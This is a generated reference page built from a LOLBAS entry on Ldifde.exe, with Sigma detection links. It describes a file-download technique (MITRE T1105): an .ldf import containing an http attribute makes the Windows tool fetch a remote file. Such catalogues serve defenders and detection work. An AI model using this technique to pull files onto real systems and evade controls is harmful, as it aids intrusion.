---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Ldifde.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `ldifde.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ldifde.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Ldifde.exe](../../tools/windows/ldifde.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | ldifde.exe |
| name | Ldifde.exe |
| type | tool |
| source | lolbas |
| url | https://twitter.com/0gtweet/status/1564968845726580736 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@0gtweet'
  Person: Grzegorz Tworek
Author: Grzegorz Tworek
Commands:
- Category: Download
  Command: Ldifde -i -f {PATH:.ldf}
  Description: Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as `thumbnailPhoto:<
    http://example.org/somefile.txt`, the file will be downloaded into IE temp folder.
  MitreID: T1105
  OperatingSystem: Windows Server with AD Domain Services role,  Windows 10 with AD LDS role.
  Privileges: Administrator
  Usecase: Download file from Internet
Created: 2022-08-31
Description: Creates, modifies, and deletes LDAP directory objects.
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_export.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_file_load.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules-emerging-threats/2019/TA/APT31/proc_creation_win_apt_apt31_judgement_panda.yml
Full_Path:
- Path: c:\windows\system32\ldifde.exe
- Path: c:\windows\syswow64\ldifde.exe
Name: Ldifde.exe
Resources:
- Link: https://twitter.com/0gtweet/status/1564968845726580736
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ldifde.yml
```

## Detection / Analysis Notes

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules-emerging-threats/2019/TA/APT31/proc_creation_win_apt_apt31_judgement_panda.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_export.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_file_load.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_export.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_file_load.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules-emerging-threats/2019/TA/APT31/proc_creation_win_apt_apt31_judgement_panda.yml
```
